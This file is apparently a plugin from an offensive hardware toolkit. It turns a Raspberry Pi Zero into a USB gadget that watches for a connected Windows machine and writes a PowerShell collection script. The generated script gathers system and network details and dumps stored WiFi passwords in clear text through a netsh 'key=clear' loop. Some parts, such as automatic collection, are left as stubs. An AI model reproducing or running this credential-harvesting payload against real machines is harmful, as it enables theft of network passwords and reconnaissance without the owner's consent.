#!/usr/bin/env python3
import os
import sys
import logging
import subprocess
import shutil
from pathlib import Path
from datetime import datetime
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
                            QTextEdit, QLabel, QProgressBar, QMessageBox, 
                            QSizePolicy, QGroupBox, QCheckBox, QComboBox)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer
import time
import psutil
import logging.handlers
import re
from ...utils.usb_gadget_helper import USBGadgetHelper

plugin_image_value = "/nsatt/storage/images/icons/info_grabber_icon.png"

class USBDevice:
    def __init__(self, device_path, name="Unknown", vendor_id=None, product_id=None):
        self.device_path = device_path
        self.name = name
        self.vendor_id = vendor_id
        self.product_id = product_id
        self.connected = False
        self.target_device = None

class InfoGrabberThread(QThread):
    """Thread for running info grabber operations"""
    progress = pyqtSignal(str)
    finished = pyqtSignal(bool, str)
    usb_status_update = pyqtSignal(dict)  # Changed to emit dictionary of USB states
    
    def __init__(self, save_dir, options, selected_usb=None):
        super().__init__()
        self.save_dir = save_dir
        self.options = options
        self.running = True
        self.selected_usb = selected_usb
        self.usb_devices = {}
        self.current_mode = None
        self.setup_logging()
        
        # Check if we're running on a Pi Zero
        if not USBGadgetHelper.is_pi_zero():
            self.logger.warning("Not running on a Pi Zero - some features may not work")

    def setup_logging(self):
        """Setup logging to file"""
        log_dir = Path("/nsatt/logs/attacks/local/info_grabber")
        log_dir.mkdir(parents=True, exist_ok=True)
        
        log_file = log_dir / f"info_grabber_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        self.logger = logging.getLogger('info_grabber')
        self.logger.setLevel(logging.DEBUG)
        
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # File handler
        fh = logging.FileHandler(log_file)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

    def check_usb_connections(self):
        """Check all USB connections and their states"""
        try:
            current_devices = {}
            
            # Get available USB ports
            ports = USBGadgetHelper.get_available_usb_ports()
            for port in ports:
                current_devices[port['path']] = {
                    'name': port['name'],
                    'type': port['type'],
                    'connected': port['in_use'],
                    'is_gadget': port['type'] == 'otg'
                }
            
            # Get connected devices
            connected_devices = USBGadgetHelper.get_connected_devices()
            for device in connected_devices:
                device_path = device['bus_info'].split()[1]
                current_devices[device_path] = {
                    'name': f"{device['manufacturer']} {device['product']}",
                    'type': 'device',
                    'connected': True,
                    'serial': device['serial'],
                    'is_gadget': False
                }
            
            # Check gadget state if in gadget mode
            if self.current_mode == 'gadget':
                state = USBGadgetHelper.check_usb_gadget_state()
                if state['gadget_active']:
                    current_devices['gadget'] = {
                        'name': 'USB Gadget',
                        'type': 'gadget',
                        'connected': bool(state['connected_device']),
                        'target_device': state['connected_device'],
                        'is_gadget': True
                    }
                    
                    # If connected to Windows, prepare for script execution
                    if state['connected_device'] and 'Windows' in state['connected_device']:
                        self.prepare_script_execution()

            self.usb_status_update.emit(current_devices)
            return current_devices
            
        except Exception as e:
            self.logger.error(f"Error checking USB connections: {e}")
            return {}

    def prepare_script_execution(self):
        """Prepare and execute info gathering script when connected to Windows"""
        try:
            if not hasattr(self, 'script_prepared'):
                self.logger.info("Preparing script execution")
                self.progress.emit("Windows system detected - preparing script")
                
                # Generate PowerShell script
                script = self.generate_powershell_script()
                
                # Save script to storage
                script_path = self.save_dir / "info_grabber.ps1"
                with open(script_path, 'w') as f:
                    f.write(script)
                
                self.script_prepared = True
                self.progress.emit("Script ready for execution")
                
        except Exception as e:
            self.logger.error(f"Failed to prepare script: {e}")
            self.progress.emit(f"Error preparing script: {e}")

    def restore_normal_usb(self):
        """Restore normal USB operation"""
        try:
            success, message = USBGadgetHelper.cleanup_gadget()
            if success:
                self.current_mode = None
                self.progress.emit("Restored normal USB operation")
                return True
            else:
                raise Exception(message)
        except Exception as e:
            self.logger.error(f"Failed to restore normal USB: {e}")
            self.progress.emit(f"Error: {str(e)}")
            return False

    def run(self):
        try:
            self.logger.info("Starting info grabber thread")
            self.progress.emit("Monitoring USB connections...")
            
            while self.running:
                current_devices = self.check_usb_connections()
                
                if self.selected_usb and self.selected_usb in current_devices:
                    device_info = current_devices[self.selected_usb]
                    if device_info['connected']:
                        self.progress.emit(f"Selected USB connected to: {device_info['target_device']}")
                        
                        # If this is the device we're watching and it's connected, proceed with data collection
                        if self.options.get('auto_collect', False):
                            # Your existing data collection code here
                            pass
                
                self.msleep(1000)  # Check every second
                
        except Exception as e:
            self.logger.error(f"Error in info grabber thread: {e}")
            self.finished.emit(False, str(e))
        finally:
            self.cleanup()

    def cleanup(self):
        """Clean up resources"""
        try:
            # Unload USB gadget modules
            subprocess.run(['sudo', 'modprobe', '-r', 'g_mass_storage'], 
                         check=False, capture_output=True)
            subprocess.run(['sudo', 'modprobe', '-r', 'dwc2'], 
                         check=False, capture_output=True)
            self.logger.info("Cleaned up USB gadget modules")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")

    def stop(self):
        """Stop the thread gracefully"""
        self.logger.info("Stopping info grabber thread")
        self.running = False

    def setup_usb_gadget(self):
        """Configure Pi Zero as USB gadget"""
        try:
            self.logger.info("Setting up USB gadget mode")
            self.progress.emit("Setting up USB gadget mode...")
            
            # First check system configuration
            issues = USBGadgetHelper.check_system_config()
            if issues:
                self.logger.warning("System configuration issues found:")
                for issue in issues:
                    self.logger.warning(f"- {issue}")
                    self.progress.emit(f"Warning: {issue}")
                
                # Try to fix issues
                success, message = USBGadgetHelper.fix_system_config()
                if success:
                    self.progress.emit("System configuration updated - please reboot")
                    return False
                else:
                    raise Exception(f"Failed to fix system configuration: {message}")

            # Setup gadget mode
            success, message = USBGadgetHelper.setup_gadget_mode(
                mode='mass_storage',
                storage_file=str(self.save_dir / "payload.bin")
            )
            
            if not success:
                raise Exception(message)
                
            self.current_mode = 'gadget'
            self.progress.emit("USB gadget mode configured successfully")
            return True

        except Exception as e:
            self.logger.error(f"Failed to setup USB gadget: {e}")
            self.progress.emit(f"Error: Failed to setup USB gadget - {str(e)}")
            return False

    def check_usb_connection(self):
        """Check if device is connected via USB to another system"""
        try:
            # Check USB devices using psutil
            connected_device = None
            for partition in psutil.disk_partitions():
                if 'usb' in partition.device.lower():
                    try:
                        device_info = subprocess.check_output(
                            ['lsusb'], 
                            text=True
                        ).split('\n')
                        for line in device_info:
                            if partition.device in line:
                                connected_device = line.split(':')[-1].strip()
                                break
                        if connected_device:
                            break
                    except subprocess.CalledProcessError:
                        pass

            # Also check USB gadget state
            usb_state = list(Path("/sys/class/udc").glob('*'))
            is_connected = bool(usb_state) or bool(connected_device)
            
            return is_connected, connected_device or "Unknown Device"
            
        except Exception as e:
            self.logger.error(f"Error checking USB connection: {e}")
            return False, "Error checking connection"

    def generate_powershell_script(self):
        """Generate PowerShell script based on selected options"""
        script_lines = []
        
        # Basic setup
        script_lines.append("New-Item -ItemType Directory -Force -Path 'C:\\Thermostat' | Out-Null")
        
        if self.options.get('system_info', False):
            script_lines.extend([
                "systeminfo > \"C:\\Thermostat\\SystemInfo\\systeminfo.txt\"",
                "Get-ComputerInfo | Format-List * > \"C:\\Thermostat\\SystemInfo\\computerinfo.txt\"",
                # Add more system info commands
            ])
            
        if self.options.get('network_info', False):
            script_lines.extend([
                "ipconfig /all > \"C:\\Thermostat\\NetworkInfo\\ipconfig.txt\"",
                "netstat -anob > \"C:\\Thermostat\\NetworkInfo\\netstat.txt\"",
                # Add more network info commands
            ])
            
        if self.options.get('wifi_info', False):
            script_lines.extend([
                "netsh wlan show profiles > \"C:\\Thermostat\\WifiInfo\\wifi_profiles.txt\"",
                "(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} > \"C:\\Thermostat\\WifiInfo\\wifi_passwords.txt\"",
            ])
            
        # Add more option sections as needed
        
        return "\n".join(script_lines)

    def check_system_requirements(self):
        """Verify system configuration for USB gadget support"""
        issues = USBGadgetHelper.check_system_config()
        if issues:
            self.logger.warning("System configuration issues found:")
            for issue in issues:
                self.logger.warning(f"- {issue}")
            
            # Attempt to fix issues
            success, message = USBGadgetHelper.fix_system_config()
            if success:
                self.logger.info(message)
                self.progress.emit(message)
            else:
                self.logger.error(message)
                self.progress.emit(f"Error: {message}")

class Plugin:
    NAME = "Info Grabber"
    CATEGORY = "Local"
    DESCRIPTION = "Gather system information using Pi Zero USB gadget mode"
    
    def __init__(self):
        self.widget = None
        self.logger = None
        self.grabber_thread = None
        self.initial_refresh_done = False
        self.save_dir = None
        self.options = {}

    def get_widget(self):
        if not self.widget:
            try:
                # Initialize logging
                logging.basicConfig(level=logging.INFO)
                self.logger = logging.getLogger(__name__)
                
                # Create main widget and layout
                self.widget = QWidget()
                layout = QVBoxLayout()
                self.widget.setLayout(layout)
                
                # Create save directory
                self.save_dir = Path("/nsatt/storage/saves/info_grabber")
                self.save_dir.mkdir(parents=True, exist_ok=True)
                
                # Options section
                options_group = QGroupBox("Information to Gather")
                options_layout = QVBoxLayout()
                
                # Add checkboxes for different info types
                self.add_option_checkbox(options_layout, 'system_info', "System Information")
                self.add_option_checkbox(options_layout, 'network_info', "Network Information")
                self.add_option_checkbox(options_layout, 'wifi_info', "WiFi Information")
                self.add_option_checkbox(options_layout, 'security_info', "Security Information")
                self.add_option_checkbox(options_layout, 'user_info', "User Information")
                self.add_option_checkbox(options_layout, 'storage_info', "Storage Information")
                self.add_option_checkbox(options_layout, 'clipboard_info', "Clipboard Content")
                
                options_group.setLayout(options_layout)
                layout.addWidget(options_group)
                
                # Button controls
                button_layout = QHBoxLayout()
                
                # Mode control buttons
                self.normal_btn = QPushButton("Normal USB Mode")
                self.normal_btn.setStyleSheet("background-color: #87CEEB")
                self.normal_btn.clicked.connect(self.set_normal_usb)
                button_layout.addWidget(self.normal_btn)
                
                self.gadget_btn = QPushButton("Gadget Mode")
                self.gadget_btn.setStyleSheet("background-color: #87CEEB")
                self.gadget_btn.clicked.connect(self.set_gadget_mode)
                button_layout.addWidget(self.gadget_btn)
                
                # Operation buttons
                start_btn = QPushButton("Start Collection")
                start_btn.clicked.connect(self.start_grabber)
                button_layout.addWidget(start_btn)
                
                stop_btn = QPushButton("Stop")
                stop_btn.clicked.connect(self.stop_grabber)
                button_layout.addWidget(stop_btn)
                
                refresh_btn = QPushButton("Refresh USB")
                refresh_btn.clicked.connect(self.refresh_usb_devices)
                button_layout.addWidget(refresh_btn)
                
                layout.addLayout(button_layout)
                
                # Progress indicators
                self.progress = QProgressBar()
                self.progress.hide()
                layout.addWidget(self.progress)
                
                self.progress_label = QLabel("")
                self.progress_label.hide()
                layout.addWidget(self.progress_label)
                
                # Add USB connection status label
                self.connection_label = QLabel("USB Status: Disconnected")
                self.connection_label.setStyleSheet("QLabel { color: red; }")
                layout.addWidget(self.connection_label)
                
                # Status display
                self.display_area = QTextEdit()
                self.display_area.setReadOnly(True)
                self.display_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
                self.display_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
                self.display_area.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
                layout.addWidget(self.display_area)
                
                # Auto-resize display area
                def updateDisplayHeight():
                    doc_height = self.display_area.document().size().height()
                    self.display_area.setFixedHeight(int(doc_height + 20))
                    self.widget.adjustSize()
                
                self.display_area.textChanged.connect(updateDisplayHeight)
                
                # Schedule initial refresh
                QTimer.singleShot(100, self.initial_refresh)
                
                # Add USB device selection
                usb_group = QGroupBox("USB Device Selection")
                usb_layout = QVBoxLayout()
                
                self.usb_combo = QComboBox()
                self.usb_combo.addItem("Select USB Device", None)
                usb_layout.addWidget(self.usb_combo)
                
                # Add auto-collect checkbox
                self.add_option_checkbox(usb_layout, 'auto_collect', 
                    "Automatically collect data when device connects")
                
                usb_group.setLayout(usb_layout)
                layout.addWidget(usb_group)
                
                # USB Status display
                self.usb_status_area = QTextEdit()
                self.usb_status_area.setReadOnly(True)
                self.usb_status_area.setMaximumHeight(100)
                layout.addWidget(self.usb_status_area)
                
                # Add USB controls
                usb_control_layout = QHBoxLayout()
                
                refresh_btn = QPushButton("Refresh USB")
                refresh_btn.clicked.connect(self.refresh_usb_devices)
                usb_control_layout.addWidget(refresh_btn)
                
                normal_usb_btn = QPushButton("Normal USB Mode")
                normal_usb_btn.clicked.connect(self.set_normal_usb)
                usb_control_layout.addWidget(normal_usb_btn)
                
                gadget_usb_btn = QPushButton("Gadget Mode")
                gadget_usb_btn.clicked.connect(self.set_gadget_mode)
                usb_control_layout.addWidget(gadget_usb_btn)
                
                layout.addLayout(usb_control_layout)
                
                # Start a monitoring thread immediately
                self.start_usb_monitor()
                
            except Exception as e:
                self.logger.error(f"Error in get_widget: {str(e)}")
                self.widget = QWidget()
                error_layout = QVBoxLayout()
                self.widget.setLayout(error_layout)
                error_label = QLabel(f"Error initializing plugin: {str(e)}")
                error_layout.addWidget(error_label)
        
        return self.widget

    def add_option_checkbox(self, layout, option_name, display_name):
        """Add a checkbox for an information gathering option"""
        checkbox = QCheckBox(display_name)
        checkbox.setChecked(True)  # Default to enabled
        self.options[option_name] = checkbox
        layout.addWidget(checkbox)

    def start_grabber(self):
        """Start the info grabber operation"""
        try:
            if self.grabber_thread and self.grabber_thread.isRunning():
                return
            
            selected_usb = self.usb_combo.currentData()
            if not selected_usb:
                QMessageBox.warning(self.widget, "Warning", "Please select a USB device first")
                return
                
            # Get selected options
            selected_options = {
                name: checkbox.isChecked()
                for name, checkbox in self.options.items()
            }
            
            # Start the grabber thread
            self.grabber_thread = InfoGrabberThread(self.save_dir, selected_options, selected_usb)
            self.grabber_thread.progress.connect(self.update_progress)
            self.grabber_thread.finished.connect(self.grabber_completed)
            self.grabber_thread.usb_status_update.connect(self.update_usb_devices)
            self.grabber_thread.start()
            
            # Show progress indicators
            self.progress.show()
            self.progress.setRange(0, 0)
            self.progress_label.show()
            
        except Exception as e:
            self.logger.error(f"Error starting info grabber: {str(e)}")
            self.display_area.append(f"Error: {str(e)}")

    def stop_grabber(self):
        """Stop the info grabber operation"""
        if self.grabber_thread and self.grabber_thread.isRunning():
            self.grabber_thread.stop()  # Signal thread to stop
            
            # Wait for thread to finish with timeout
            if not self.grabber_thread.wait(5000):  # 5 second timeout
                self.logger.warning("Thread did not stop gracefully, forcing termination")
                self.grabber_thread.terminate()
            
            self.display_area.append("Info grabber stopped")
            self.progress.hide()
            self.progress_label.hide()
            self.connection_label.setText("USB Status: Disconnected")
            self.connection_label.setStyleSheet("QLabel { color: red; }")

    def clear_display(self):
        """Clear the display area"""
        self.display_area.clear()

    def update_progress(self, message):
        """Update progress message"""
        self.progress_label.setText(message)
        self.display_area.append(message)

    def grabber_completed(self, success, message):
        """Handle completion of info grabber operation"""
        self.progress.hide()
        self.progress_label.hide()
        
        if success:
            self.display_area.append("\nSuccess: " + message)
        else:
            self.display_area.append("\nError: " + message)

    def initial_refresh(self):
        """Perform initial refresh when widget is first shown"""
        if not self.initial_refresh_done:
            self.display_area.append("Ready to gather information.")
            self.display_area.append("Select options and click Start.")
            self.initial_refresh_done = True

    def initialize(self):
        """Initialize plugin"""
        print(f"Initializing {self.NAME}")
        return True

    def terminate(self):
        """Clean up resources"""
        if self.grabber_thread and self.grabber_thread.isRunning():
            self.grabber_thread.terminate()
            self.grabber_thread.wait()
        print(f"Terminating {self.NAME}")

    def update_connection_status(self, connected, device_name):
        """Update the USB connection status label"""
        if connected:
            self.connection_label.setText(f"USB Status: Connected to {device_name}")
            self.connection_label.setStyleSheet("QLabel { color: green; }")
        else:
            self.connection_label.setText("USB Status: Disconnected")
            self.connection_label.setStyleSheet("QLabel { color: red; }")

    def start_usb_monitor(self):
        """Start USB monitoring thread"""
        try:
            self.monitor_thread = InfoGrabberThread(self.save_dir, {})
            self.monitor_thread.progress.connect(self.update_progress)
            self.monitor_thread.usb_status_update.connect(self.update_usb_devices)
            self.monitor_thread.start()
            self.display_area.append("USB monitoring started")
        except Exception as e:
            self.logger.error(f"Failed to start USB monitor: {e}")
            self.display_area.append(f"Error starting USB monitor: {e}")

    def update_usb_devices(self, devices):
        """Update USB device list and status display"""
        try:
            current_selection = self.usb_combo.currentData()
            
            # Update combo box
            self.usb_combo.clear()
            self.usb_combo.addItem("Select USB Device", None)
            
            # Update status display
            self.usb_status_area.clear()
            
            for device_path, info in devices.items():
                # Create display text
                display_text = f"{info['name']}"
                if info.get('type'):
                    display_text += f" ({info['type']})"
                
                # Add to combo box
                self.usb_combo.addItem(display_text, device_path)
                
                # Add to status display
                status_text = f"Device: {display_text}\n"
                status_text += f"Path: {device_path}\n"
                status_text += f"Connected: {'Yes' if info.get('connected') else 'No'}\n"
                
                if info.get('target_device'):
                    status_text += f"Connected to: {info['target_device']}\n"
                if info.get('serial'):
                    status_text += f"Serial: {info['serial']}\n"
                    
                status_text += "-" * 40 + "\n"
                self.usb_status_area.append(status_text)
                
                # Update connection label if this is a gadget device
                if info.get('is_gadget') and info.get('connected'):
                    self.update_connection_status(True, info.get('target_device', 'Unknown Device'))
            
            # Restore previous selection if still available
            if current_selection:
                index = self.usb_combo.findData(current_selection)
                if index >= 0:
                    self.usb_combo.setCurrentIndex(index)
                    
        except Exception as e:
            self.logger.error(f"Error updating USB devices: {e}")
            self.display_area.append(f"Error updating USB devices: {e}")

    def refresh_usb_devices(self):
        """Manually refresh USB device list"""
        if hasattr(self, 'monitor_thread') and self.monitor_thread.isRunning():
            self.monitor_thread.check_usb_connections()
        self.display_area.append("Refreshing USB devices...")

    def set_normal_usb(self):
        """Switch to normal USB operation"""
        try:
            if not hasattr(self, 'monitor_thread'):
                self.start_usb_monitor()
            
            if self.monitor_thread and self.monitor_thread.isRunning():
                if self.monitor_thread.restore_normal_usb():
                    self.display_area.append("Switched to normal USB mode")
                    self.normal_btn.setStyleSheet("background-color: #90EE90")
                    self.gadget_btn.setStyleSheet("background-color: #87CEEB")
                else:
                    self.display_area.append("Failed to switch to normal USB mode")
                    self.normal_btn.setStyleSheet("background-color: #FFB6B6")
            self.refresh_usb_devices()
        except Exception as e:
            self.display_area.append(f"Error switching USB mode: {e}")
            self.normal_btn.setStyleSheet("background-color: #FFB6B6")

    def set_gadget_mode(self):
        """Switch to USB gadget mode"""
        try:
            if not hasattr(self, 'monitor_thread'):
                self.start_usb_monitor()
            
            if self.monitor_thread and self.monitor_thread.isRunning():
                # Stop any existing gadget mode
                self.monitor_thread.restore_normal_usb()
                
                # Setup new gadget mode
                if self.monitor_thread.setup_usb_gadget():
                    self.display_area.append("Switched to USB gadget mode")
                    self.gadget_btn.setStyleSheet("background-color: #90EE90")
                    self.normal_btn.setStyleSheet("background-color: #87CEEB")
                else:
                    self.display_area.append("Failed to switch to USB gadget mode")
                    self.gadget_btn.setStyleSheet("background-color: #FFB6B6")
            self.refresh_usb_devices()
        except Exception as e:
            self.display_area.append(f"Error switching USB mode: {e}")
            self.gadget_btn.setStyleSheet("background-color: #FFB6B6")
